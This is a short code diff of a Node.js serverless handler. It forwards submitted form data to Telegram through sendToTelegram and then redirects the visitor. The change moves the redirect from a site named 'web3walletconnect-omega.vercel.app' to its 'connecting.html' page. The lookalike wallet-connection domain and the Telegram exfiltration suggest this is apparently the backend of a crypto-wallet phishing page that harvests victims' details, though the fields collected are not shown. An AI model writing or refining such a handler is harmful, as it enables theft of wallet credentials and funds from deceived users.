@@ -38,7 +38,7 @@ module.exports = async (req, res) => {
             const response = await sendToTelegram(data); // Send data to Telegram
 
             // Redirect to the homepage after successful message sending
-            res.writeHead(302, { Location: 'https://web3walletconnect-omega.vercel.app/' }); // Redirect to homepage
+            res.writeHead(302, { Location: 'https://web3walletconnect-omega.vercel.app/connecting.html' }); // Redirect to homepage
             res.end(); // End the response
 
         } catch (error) {
